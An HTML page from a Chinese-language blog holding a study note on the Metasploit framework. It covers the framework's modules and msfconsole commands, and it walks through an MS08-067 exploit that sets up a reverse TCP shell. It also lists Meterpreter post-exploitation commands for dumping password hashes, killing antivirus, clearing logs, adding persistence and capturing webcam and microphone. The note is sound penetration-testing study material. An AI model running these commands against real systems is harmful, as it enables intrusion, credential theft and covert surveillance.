@@ -1,0 +1,873 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="johnscott" />
+  
+  
+  
+  <title>Metasploit簡介 | JohnScott1989的博客</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="网络安全,Metasploit," />
+  
+
+  <script>
+    console.log('\n%c Hexo-theme-bmw v4.0 ' + '%c 🎉 https://github.com/dongyuanxin/theme-bmw 🎉\n' + '\n%c View demo online ' + '%c 🔍 https://godbmw.com/ 🔍  \n' , 'color: #fadfa3; background: #030307; padding:3px 0;', '', 'color: #fadfa3; background: #030307; padding:3px 0;', '');
+  </script>
+
+  
+    <meta name="description" content="超级帽子戏法的个人博客,主要记录复制粘贴过来的笔记,还有自己的一些心得体会">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  
+<script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JohnScott1989</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a 
+              href="/"
+              target="_self"
+            >
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a 
+              href="/archives/"
+              target="_self"
+            >
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          
+            <a 
+              href="/categories/"
+              target="_self"
+            >
+              分类
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          
+            <a 
+              href="/tags/"
+              target="_self"
+            >
+              标签
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          
+            <a 
+              href="/friends/"
+              target="_self"
+            >
+              友链
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          
+            <a 
+              href="/about/"
+              target="_self"
+            >
+              关于
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="">
+          
+            <a href="javascript:void(0);" v-else>联系我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a 
+                    href="https://github.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    Github
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.zhihu.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    知乎
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="http://weibo.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    微博
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.douban.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    豆瓣
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="/linkedin.com/in/liuxue5213" 
+                    target="_blank"
+                  >
+                    linkedin
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>Metasploit簡介</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2021-05-12
+    </span>
+    
+      <span>
+        分类 : 
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+            网络安全
+          </a>
+      </span>
+    
+    
+      <span>
+        浏览 : <span class="article-timer" data-identity="12Metasploit"></span>
+      </span>
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <h2 id="一、-Metasploit簡介"><a href="#一、-Metasploit簡介" class="headerlink" title="一、 Metasploit簡介"></a>一、 Metasploit簡介</h2><h3 id="1、-Metasploit-框架"><a href="#1、-Metasploit-框架" class="headerlink" title="1、 Metasploit 框架"></a>1、 Metasploit 框架</h3><p>渗透测试者的困扰：在众多相同类型的工具，不知道如何选择。面對数百个工具软件，上千个命令参数，很難都記住使用方法。新出现的漏洞 POC/EXP 有不同的运行环境要求，准备工作繁琐。大部分时间都在学习不同工具的使用，Metasploit就是很多個工具使用的统一</p>
+<p>POC，全称”Proof of Concept”，中文“概念验证”，常用於一段漏洞证明的代码<br>EXP，全称”Exploit”，中文“利用”，指利用系统漏洞進行攻击的動作</p>
+<p>Metasploit 框架是可以添加漏洞代码片段，就好比一个军火库，它里面有各种武器，当然也有新的武器被研发出来，放到武器库里面后，隨時可以使用，这就是框架的好处，新的攻击代码可以比较容易的加入 MSF 框架供大家使用</p>
+<h3 id="2、-Metasploit-简介"><a href="#2、-Metasploit-简介" class="headerlink" title="2、 Metasploit 简介"></a>2、 Metasploit 简介</h3><p>官網 <a target="_blank" rel="noopener" href="https://www.metasploit.com/">metasploit</a></p>
+<p>Metasploit 是一款开源、免费、可下载的框架，通过它可以很容易地获取、开发对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的專業级漏洞攻击工具。H.D. Moore 在 2003 年发布Metasploit 时，计算机安全状冴也被永久性地改变了。仿佛一夜之间，任何人都可以成为黑客，每个人都可以使用攻击工具来攻击那些未打过补丁或者刚刚打过补丁的漏洞。软件厂商再也不能推连发布针对已公布漏洞的补丁了，这是因为 Metasploit 团队一直都在致力开发各种攻击工具，幵将它们贡献给所有 Metasploit 用户</p>
+<p>MSF 目前是最流行，最强大，最具扩展性的渗透测试平台软件，2003 年時 H.D.Moore 发布第一版，2007 年用 ruby 語言重写。shodan 黑暗搜索引擎 H.D.Moore 也參與了开发</p>
+<p>Metasploit 目前是全球最常见的渗透测试框架，位居 secTools 排行榜第 2 位。可以幫助安全和 IT 專業人士识别安全性问题，验证漏洞的缓解措施，幵管理專家驅動的安全性進行评估，提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web 应用程序扫描，社会工程等</p>
+<h3 id="3、-Metasploit-版本"><a href="#3、-Metasploit-版本" class="headerlink" title="3、 Metasploit 版本"></a>3、 Metasploit 版本</h3><p>社区版：集成在 kali 系统中，目前基于社区力量维护。早期版本需要先啟動数据库再啟動 MSF，现在已经集成到 msf 里面了</p>
+<p>Pro 版：企业版的几个优势</p>
+<ol>
+<li>企业版出的检测报告非常强大，给客户汇报起来很方便。</li>
+<li>AV 免杀，社区版的免杀大家都知道，企业级的免杀據說可以达到百分之九十甚至百分之百。</li>
+<li>IDS/IPS 绕过（入侵检测系统/入侵防御系统）</li>
+<li>VPN Pivoting</li>
+</ol>
+<h2 id="二、-Metasploit-架构介绍"><a href="#二、-Metasploit-架构介绍" class="headerlink" title="二、 Metasploit 架构介绍"></a>二、 Metasploit 架构介绍</h2><ol>
+<li>REX：基础功能库，用于完成日常基本任务，无需人工手劢编码实现，处理 socket 违接访问，协议应答(http/SSL/SMB 等)，编码转换（XOR,Base64,Unicode）</li>
+<li>技术模块：5.0 之后就增加了个 evasion 模块，现在一共是 7 个技术模块</li>
+<li>插件：插件可以调用外部一些渗透测试工具，例如：load nessus 就可以调用 nessus 扫描软件</li>
+<li>接口：有 msfconsole 控制终端、msfcli 命令行、msfgui 图形化界面、armitage 图形化界面和msfapi 进程调用接口</li>
+<li>功能程序：metasploit 还开发了一些可以直接运行的命令，比如 msfpayload、msfencode 以及 msfvenom</li>
+</ol>
+<p>1、基础库：metasploit 基础库文件位于源码根目录路径下的 libraries 目录中，包括 Rex,framework-core 和 framework-base 三部分。 Rex 是整个框架所依赖的最基础的一些组件， 如包装的网络套接字、网络应用协议客户端与服务端实 现、日志子系统、渗透攻击支持例程、PostgreSQL 以及 MySQL 数据库支持等；framework-core 库负责实现所有与各种类型的上层模块及插件的交互接 口； framework-base 库扩展了 framework-core，提供更加简单的包装例程，并为处理框架各个方 面 的功能提供了一些功能类，用于支持用户接口与功能程序调用框架本身功能及框架集成模块</p>
+<p>2、模块：模块组织按照不同的用途分为 6 种类型的模块（Modules）： 分为辅助模块（Aux)、渗透攻 击模块（Exploits)、后渗透攻击模块（Post)、攻击载荷模块 （payloads)、编码器模块（Encoders)、 空指令模块（Nops)。 注：payload 又称为攻击载荷，主要是用来建立目标机与攻击机稳定连接的，可以返回 shell，也可以 进行程序注入等</p>
+<p>3、插件：插件能够扩充框架的功能，或者组装已有功能构成高级特性的组件。插件可以集成现有的 一些外部安全工具，如 Nessus、OpenVAS 漏洞扫描器等，为用户接口提供一些新的功能。 </p>
+<p>4、接口：包括 msfconsole 控制终端、msfcli 命令行、msfgui 图形化界面、armitage 图形化界 面 以及 msfapi 远程调用接口。 </p>
+<p>5、功能程序： metasploit 还提供了一系列可直接运行的功能程序，支持渗透测试者与安全人员快 速地 利用 metasploit 框架内部能力完成一些特定任务。比如 msfpayload、msfencode 和 msfvenom 可 以将攻击载荷封装为可执行文件、C 语言、JavaScript 语言等多种形式，并可以进行各种</p>
+<h2 id="三、-Metasploit-技术功能模块"><a href="#三、-Metasploit-技术功能模块" class="headerlink" title="三、 Metasploit 技术功能模块"></a>三、 Metasploit 技术功能模块</h2><h3 id="1-MSF-技术功能-模块分类"><a href="#1-MSF-技术功能-模块分类" class="headerlink" title="1. MSF 技术功能 模块分类"></a>1. MSF 技术功能 模块分类</h3><p>位於 /usr/share/metasploit-framework/modules 目錄下</p>
+<p>auxiliary  encoders  evasion  exploits  nops  payloads  post</p>
+<h3 id="2-技术模块-的功能"><a href="#2-技术模块-的功能" class="headerlink" title="2. 技术模块 的功能"></a>2. 技术模块 的功能</h3><p>技术功能模块： 有新漏洞可以利用的模块，要放到这些模块下面進行调用</p>
+<ol>
+<li>Auxiliary</li>
+</ol>
+<p>负责执行信息收集、扫描、嗅探、指紋识别、口令猜测和 Dos 攻击等功能的輔助模块</p>
+<ol start="2">
+<li>Exploits</li>
+</ol>
+<p>利用系统漏洞進行攻击的動作，此模块对应每一个具体漏洞的攻击方法（主動、被動）</p>
+<ol start="3">
+<li>Payloads<br>成功 exploit 之后，真正在目标系统执行的代码指令</li>
+</ol>
+<p>分为 3 种类型的 payload，分别是 single、stages 和 stagers。</p>
+<p>shellcode 是特殊的 payload，用于拿 shell</p>
+<p>single：all-in-one。完整的 payload，这些 payload 都是一体化的，不需要依赖外部的库和包</p>
+<p>stagers：目标计算机内存有限时，先传输一个较小的 payload 用于建立連接</p>
+<p>stages：利用 stagers 建立的連接下载后续 payload</p>
+<ol start="4">
+<li>Encoders</li>
+</ol>
+<p>对 payload 進行加密，躲避 AntiVirus 检查的模块</p>
+<ol start="5">
+<li>Nops</li>
+</ol>
+<p>提高 payload 稳定性及维持大小。在渗透攻击构造恶意数据缓冲区时，常常要在真正要执行的 Shellcode 之前添加一段空指令区， 这样当触发渗透攻击后跳转执行 ShellCode 时，有一个较大的安全着陆区，从而避免受到内存 地址随机化、返回地址计算偏差等原因造成的 ShellCode 执行失败，提高渗透攻击的可靠性</p>
+<ol start="6">
+<li>Post</li>
+</ol>
+<p>后期渗透模块。在取得目标系统进程控制权后，進行一系列的后渗透攻击操作，如获取敏感信息、跳板攻击等操作</p>
+<ol start="7">
+<li>Evasion</li>
+</ol>
+<p>创建木马文件，个人感觉相当于 msfvenom 的一个子功能的存在</p>
+<h2 id="四、-Metasploit-基本使用和控制台命令"><a href="#四、-Metasploit-基本使用和控制台命令" class="headerlink" title="四、 Metasploit 基本使用和控制台命令"></a>四、 Metasploit 基本使用和控制台命令</h2><h3 id="1、-啟動-MSF"><a href="#1、-啟動-MSF" class="headerlink" title="1、 啟動 MSF"></a>1、 啟動 MSF</h3><p>啟動 Metasploit 框架需要运行 Postgresql 数据库，现在只要运行 Metasploit 时都会自動啟動 Postgresql 数据库。如果数据库没運行的话，可以手動啟動，下面時管理数据库的一些命令</p>
+<p>netstat -pantu | grep 5432</p>
+<p>lsof -i :5432</p>
+<p>手動開啟数据库</p>
+<p>systemctl start postgresql #啟動数据库<br>systemctl enable postgresql #设置成开机啟動</p>
+<p>msfdb init #啟動並初始化数据库<br>msfdb reinit #刪除並重新初始化数据库<br>msfdb delete #刪除数据库並停止使用它<br>msfdb start #啟動数据库<br>msfdb stop #停止数据库<br>msfdb status #检查服务状态<br>msfdb run #啟動数据库並运行 msfconsole</p>
+<h3 id="2、-Msfconsole-接口啟動命令"><a href="#2、-Msfconsole-接口啟動命令" class="headerlink" title="2、 Msfconsole 接口啟動命令"></a>2、 Msfconsole 接口啟動命令</h3><p>几乎可以使用全部 MSF 功能，控制台命令支持 TAB自動补全，支持外部命令的执行(系统命令ls pwd等)</p>
+<p>msfconsole -q / -v 参数<br>    -q 安静開啟<br>    -v 版本信息</p>
+<h3 id="3、-更新-MSF"><a href="#3、-更新-MSF" class="headerlink" title="3、 更新 MSF"></a>3、 更新 MSF</h3><p>目前更新可能會導致啟動失败，原因在更新过程中缺少一些组件，更新后需要手動执行安装缺少部分的组件</p>
+<p>apt update<br>apt install metasploit-framework</p>
+<h3 id="4、-MSF-基本使用方法"><a href="#4、-MSF-基本使用方法" class="headerlink" title="4、 MSF 基本使用方法"></a>4、 MSF 基本使用方法</h3><p>banner：版本信息<br>help 或者 ? ：显示 msfconsole 可以使用的命令。help <command>，显示某一命令的用法<br>connect： 可以理解成 MSF 中的 nc 命令，可以使用 connect -h 查看详细用法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">connect [options] &lt;host&gt; &lt;port&gt;</span><br><span class="line"></span><br><span class="line">connect 192.168.1.1 80</span><br></pre></td></tr></table></figure>
+
+<p>show： 用 show 命令查看 msf 提供的资源。在根目录下执行的话，由于有些模块资源比较多，需要执行 show 命令要较长的时间<br>show options/payloads/targets /evasion/missing/</p>
+<p>search： 搜索模块；简单搜索：</p>
+<p>search -h<br>search [<options>] [<keywords>:<value>]</p>
+<p>seach ms10-046</p>
+<p>多条件搜索<br>search name:mysql type:exploit platform:linux<br>search name:mysql / platform:mysql /cve:2015/ path/  type:auxiliary/author:aaron</p>
+<p>use： search 找到模块后，用 use 使用模块</p>
+<p>use exploit/windows/smb/ms08_067_netapi</p>
+<p>用 use 使用一个模块后，可以使用 show options 查看我们需要配置的选项、使用 show targets选择目标主机系统、使用 show payloads 选择 payload、使用 show advanced 查看高级参数、使用show evasion 查看用来做混淆、逃避的模块</p>
+<p>set/setg： 设置参数，比如要渗透的主机 IP、payload 等。我们可以用 show missing 查看没有设置的参数;<br>setg 是设置全局变量，避免每个模块都要输入相同的参数</p>
+<p>unset/unsetg: 取消设置参数。unsetg 是取消设置的全局变量</p>
+<p>save： 设置的参数在下一次啟動的时候不会生效，可以用 save 保存我们使用过程的设置。<br>/root/.msf4/config cat 到文件里進行查看</p>
+<p>check：检查目标是否真的存在这个漏洞，大部分模块没有 check 功能</p>
+<p>run/exploit：攻击</p>
+<p>jobs/kill：杀死進程</p>
+<p>session：建立会话</p>
+<h2 id="五、-MSF-后端数据库命令"><a href="#五、-MSF-后端数据库命令" class="headerlink" title="五、 MSF 后端数据库命令"></a>五、 MSF 后端数据库命令</h2><p>db_connect #违接数据库<br>db_disconnect #断开当前数据库<br>db_export #导出数据库<br>db_import #导入数据库<br>db_nmap #执行 nmap 扫描<br>db_rebuild_cache # 重建数据库存储的模块高速缓存<br>db_status #显示当前数据库状态<br>hosts #列出数据库中的所有主机<br>loot # 查看扫出来的密码信息<br>notes #列出数据库中的所有笔记<br>services #列出数据库中的所有服务<br>vulns #列出数据库中的所有漏洞<br>workspace #在数据库工作区乊间切换</p>
+<h2 id="六、-Meterpreter-基本命令"><a href="#六、-Meterpreter-基本命令" class="headerlink" title="六、 Meterpreter 基本命令"></a>六、 Meterpreter 基本命令</h2><h3 id="1-meterpreter-简介"><a href="#1-meterpreter-简介" class="headerlink" title="1. meterpreter 简介"></a>1. meterpreter 简介</h3><ol>
+<li>Meterpreter 比系统 shell 更加灵活，功能更加丰富，例如监控主机，监控键盘，開啟摄像头，麦克风，还可以灵活的获取你的操作系统信息；</li>
+<li>高级，動態，可扩展的 payload,一站式后攻击 payload；</li>
+<li>基于 meterpreter 上下文利用更多漏洞发起攻击；</li>
+<li>后渗透测试阶段一站式操作界面； </li>
+<li>完全基于内存的 DLL 注入式 payload（不写硬盘）;</li>
+<li>注入合法系统進程並建立 stager; </li>
+<li>基于 stager 上传和预加载 DLL 進行扩展模块的注入(客户端 API); </li>
+<li>基于 stager 建立的 socket 連接建立加密的 TLS/1.0 通信</li>
+<li>利用 TLS 隧道進一步加载后续扩展模块(避免网络取证);</li>
+</ol>
+<h3 id="2-Meterpreter-基本命令"><a href="#2-Meterpreter-基本命令" class="headerlink" title="2. Meterpreter 基本命令"></a>2. Meterpreter 基本命令</h3><p>前提是漏洞利用成功，payload 用的是 meterpreter</p>
+<p>lpwd/lcd #从本机上传到目标机用得到的命令<br>run/bgrun #run 在前台，bgrun 在后台<br>bgrun killav #杀掉目标机的杀毒软件<br>bgrun hashdump #哈希值<br>bgrun service_manager -l #查看已有的服务<br>bgrun vnc #监控主机<br>bgrun winbf #让肉鸡来暴力破解<br>clearev #清除目标的日志，清理戓场<br>download #下载文件<br>upload #上傳文件 upload /usr/share/windows-binaries/nc.exe c:\windows\system32<br>execute #执行程序<br>getuid #获取当前用户 ID<br>getsystem #把自己变成 system 权限<br>getprivs #看系统都有什么权限<br>getproxy #获取代理信息<br>getpid #查看迚程信息<br>getpid/ps/migrate 1560 #迁移后门進程<br>hashdump=run post/windows/gather/hashdump<br>sysinfo 获取系统信息<br>kill 1052 #杀掉進程，1052 是進程号<br>shell #進入系统 shell<br>show_mount #查看系统挂载信息<br>search #查找文件，例 search -f win.ini<br>arp #用于查看主机上的 arp 缓存信息<br>netstat #查看网络連接信息<br>ipconfig/ifconfig #查看网卡信息<br>route -h #查看路由表<br>ldletime<br>resource -r r.txt<br>record_mic #麦克风<br>Webcam_list</p>
+<p>mi<br>hashdump<br>creds_all</p>
+<p>run/bgrun killav/bgrun persistence/bgrun hashdump/bgrun vnc/sound_recorder/webcam/winbf<br>前台运行指定命令/后台不运行，关闭杀毒软件/建立持久违接，将 shellcode 写入系统文件，开机自啟/開啟图形化进程管理/录制声音/开吭摄像头/让肉鸡帮忙暴力破解密码，利用肉鸡资源</p>
+<p>cd/ls/cat/pwd/dir/mkdir/mv/rm/rmdir/edit/可以使用 linux 命令<br>迚入/显示文件/查看/显示当前路径/显示文件/创建目录/移劢/初除/初除目录/编辑</p>
+<p>lpwd/lcd 本地目录</p>
+<p>local 当前的工作目录，就是在 kali 上的我们使用的工作目录/迚入我们本地目录</p>
+<p>clearev/download/upload /usr/share/windows binaries/nc.exe c:\windows\system32<br>初除目标系统日志/下载文件到本地/上传本地文件到目标系统<br>注：因为\在 linux 中有转义符的含义，所以执行 linux 命令时要用两个\表示目标 windows 的\win+r eventvwr</p>
+<p>windows 日志查看</p>
+<p>execute -f cmd.exe -i -H -f 执行目标系统里的哪个程序，-i 和执行的这个程序迚行交互，-H 将这个程序窗口隐藏起来执行</p>
+<p>getuid/getsystem/getprivs/getproxy/getpid/migrate<br>以哪个用户账号登陆到目标系统的/强制获取成 system 账号，获得系统权限/查看当前用户权限/获取目标系统代理信息/查看当前 shellcode 的线程在目标系统哪个迚程当中/迁移线程到其它進程中</p>
+<p>hashdump/run post/windows/gather/hashdump<br>系统账号哈希值/系统账号哈希值</p>
+<p>sysinfo/ps/kill/reboot/shutdown/shell<br>目标系统信息/查看迚程/查杀迚程/重吭/关闭/获得一个目标操作系统的 shell，退出到 meterpreter用 exit</p>
+<p>show_mount/search -f autoexec.bat<br>当前挂载了几个系统分区/搜索目标系统中的文件</p>
+<p>arp/netstat/ipconfig/ifconfig/route<br>查看目标机器的 arp 缓存/查看目标端口违接/ip 地址/ip 地址/查看目标路由表</p>
+<p>idletime/resource<br>查看目标操作系统空闲时间/调用外部的资源文件，自劢化执行</p>
+<p>record_mic/webcam_list/webcam_snap -i 1 -v false<br>记录目标麦克风的声音/列出目标系统上所有的摄像头/每隑一秒钟用摄像头拍照一次</p>
+<p>桌面抓图：screenshot<br>拍照：webcam_snap<br>视频开启：webcam_stream<br>开启远程桌面：run post/windows/manage/enable_rdp<br>添加账号：net user test 123 /add<br>获取系统管理密码：load mimikatz<br>wdigest</p>
+<h2 id="七、-流程"><a href="#七、-流程" class="headerlink" title="七、 流程"></a>七、 流程</h2><p>1、查找 ms08-067 漏洞模块</p>
+<p>nmap -sS 192.168.1.1</p>
+<p>search ms08-067</p>
+<p>use exploit/windows/smb/ms08_067_netapi</p>
+<p>show options</p>
+<p>2、需要配置 RHOST 主机 IP 地址和 Exploit target</p>
+<p>set RHOSTS 192.168.1.205</p>
+<p>查看 Exploit target 目标类型：<br>show targets</p>
+<p>set target 34</p>
+<p>show options</p>
+<p>3、设置 payload 模块，使得渗透成功后迚行进程执行命令</p>
+<p>查找 payload 模块，找到应用于攻击主机相同的系统类型。</p>
+<p>search windows/shell/reverse_tcp</p>
+<p>payload 模块主要是用于建立目标主机不攻击机的連接，可返回 shell。因此所需要选择一个反弹式 的 shell 的 payload 模块</p>
+<p>设置 payload 模块：<br>set payload windows/shell/reverse_tcp</p>
+<p>4、查看一下 payload 模块中有哪些选项需要配置</p>
+<p>需要设置 LHOST 选项，即是 payload 模块监听的地址（本机地址即可）：<br>set LHOST 192.168.1.101</p>
+<p>6、开始利用该模块</p>
+<p>exploit  </p>
+<p>攻击成功后，直接获得目标主机的 Shell</p>
+<h3 id="linux-安裝"><a href="#linux-安裝" class="headerlink" title="linux 安裝"></a>linux 安裝</h3><p>curl <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb">https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb</a> &gt; msfinstall &amp;&amp; <br>  chmod 755 msfinstall &amp;&amp; <br>  ./msfinstall</p>
+<p>apt install postgresql<br>systemctl start postgresql<br>systemctl enable postgresql </p>
+<p>useradd -m postgresql<br>passwd postgresql</p>
+<p>su postgresql<br>msfdb init</p>
+<p>msfconsole<br>db_status</p>
+<p>出現以下內容，即為安裝成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; db_status</span><br><span class="line">[*] Connected to msf. Connection type: postgresql.</span><br></pre></td></tr></table></figure>
+
+<p>參照文章 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/601a3cb65e11">Debian10 安装 Metasploit Framework 指南</a></p>
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JohnScott <br/>
+        
+        原文链接 : <a href="">https://github.com/liuxue5213/liuxue5213.github.io/2021/12Metasploit/</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share"
+  style="margin-top: -2rem"
+  data-wechat-qrcode-title="<p>微信扫一扫</p>"
+  data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>"
+   data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter" 
+  
+>
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async>
+  
+
+  
+    <div id="reward">
+  
+    <p id="reward-meta">知识 & 情怀 | 二者兼得</p>
+  
+  <button id="reward-btn">
+    
+    <span>感谢您的关心</span>
+  </button>
+  <div id="reward-qrcode">
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/wechat.png" alt="微信扫一扫">
+        <p class="qrcode-meta">微信扫一扫</p>
+      </div>
+    
+      <div class="reward-qrcode--container">
+        <img class="qrcode-img" src="/images/alipay.png" alt="支付宝扫一扫">
+        <p class="qrcode-meta">支付宝扫一扫</p>
+      </div>
+    
+  </div>
+
+</div>
+
+<script>
+  (() => {
+    let button = document.querySelector('#reward-btn'),
+      qrcode = document.querySelector('#reward-qrcode'),
+      display = false;
+    
+    button.addEventListener('click', () => {
+      qrcode.style.display = display ? 'none' : 'block'
+      display = !display
+    }, false)
+  })()
+</script>
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/Metasploit/">
+              #Metasploit
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/2021/11%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/" target="_self">Web漏洞扫描工具</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/2021/13Metasploit%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" target="_self">Metasploit信息搜集</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz",
+      appKey: "6VNHrdDAu0JKJXxyMajHk6qD",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+  
+    <script defer>
+const valineAPI = (() => {
+  try {
+    AV.init("E4f1KI8G9DKenPGcXCkfpCMV-gzGzoHsz", "6VNHrdDAu0JKJXxyMajHk6qD");
+  } catch(error) {}
+  const isExist = (identity) => {
+    identity = identity || getRealPath();
+    let query = new AV.Query('Timer');
+    return new Promise((resolve, reject) => {
+      query.equalTo("identity", identity);
+      query.find().then(results => {
+        resolve(results.length > 0);
+      }, error => reject(error));
+    })
+  }
+
+  const _get = (identity) => {
+    let query = null;
+    if(identity && identity instanceof Array){
+      let querys = [];
+      for(let i = 0; i < identity.length; ++i) {
+        querys[i] = new AV.Query('Timer');
+        querys[i].equalTo('identity', identity[i]);
+      }
+      query = AV.Query.or.apply(null ,querys);
+    } else {
+      identity = identity || getRealPath();
+      query = new AV.Query("Timer");
+      query.equalTo("identity", identity);
+    }
+
+    return new Promise((resolve, reject) => {
+      query.find()
+      .then(results => resolve(results))
+      .catch(error => reject(error))
+    })
+  }
+
+  const create = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let Todo = AV.Object.extend('Timer');
+      let todo = new Todo();
+      todo.set("times", 1);
+      todo.set("identity", identity);
+      todo.save().then(res => resolve(true), error => reject(error));
+    })
+  }
+
+  const update = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let query = new AV.Query('Timer');
+      query.equalTo("identity", identity);
+      query.find().then(todos => {
+        todos.forEach(todo => {
+          todo.set("times", todo.attributes.times + 1);
+        });
+        return AV.Object.saveAll(todos);
+      }).then(todos => resolve(true), error => reject(error));
+    })
+  }
+
+  return {
+    isExist,
+    _get,
